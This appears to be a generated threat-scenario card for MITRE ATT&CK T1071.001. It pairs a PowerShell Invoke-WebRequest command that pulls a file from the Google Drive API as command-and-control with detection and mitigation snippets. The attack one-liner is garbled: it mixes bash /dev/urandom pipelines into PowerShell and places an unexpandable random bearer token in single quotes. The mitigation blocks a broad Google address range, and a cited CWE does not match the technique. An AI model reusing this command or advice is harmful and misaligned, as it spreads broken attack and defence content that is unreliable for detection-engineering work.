---
type: campaign
scenario_id: 482
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using Invoke-WebRequest for C2 via Google Drive API.

## Threat Description
Using Invoke-WebRequest for C2 via Google Drive API.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://www.googleapis.com/drive/v3/files/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)?alt=media -Headers @{Authorization='Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)'} -OutFile C:\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt"
```

## Detection Logic
Monitor Invoke-WebRequest Google Drive: `wmic process where name='powershell.exe' get commandline | findstr www.googleapis.com`; Network traffic: `tshark -Y 'http.host contains www.googleapis.com'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block Google Drive API: `netsh advfirewall firewall add rule name='Block Google Drive' dir=out action=block remoteip=142.250.0.0/15`.

## AI Training Prompt
Train AI to detect Invoke-WebRequest C2 via Google Drive API by analyzing HTTP headers, Google Drive API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
